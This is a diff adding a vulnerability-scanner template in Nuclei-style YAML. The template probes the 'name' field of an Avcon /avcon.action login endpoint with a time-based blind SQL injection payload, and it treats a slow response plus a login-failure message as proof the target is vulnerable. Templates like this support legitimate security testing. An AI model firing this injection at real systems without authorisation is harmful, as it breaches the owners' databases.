@@ -1,0 +1,27 @@
+id: Avcon-zhgl-name-sql
+
+info:
+  name: Avcon-zhgl-name-sql
+  author: XXX
+  severity: high
+  description: Avcon-zhgl-name-sql
+  tags: Avcon
+
+http:
+  - raw:
+      - |              
+        POST /avcon.action HTTP/1.1
+        Content-Type: application/x-www-form-urlencoded
+        Host: 
+
+        name=0'XOR({{mysql}})XOR'Z&password=u]H[ww6KrA9F.x-F
+
+    payloads:
+      mysql:
+        - "if(now()=sysdate()%2Csleep(6)%2C0)"
+               
+    matchers:     
+      - type: dsl
+        name: mysql
+        dsl:
+          - "status_code_1 == 200 && duration>=5 && duration<=8 && contains(body,'登录失败,请查询您的信息输入是否正确') && contains(header,'text/plain')" 
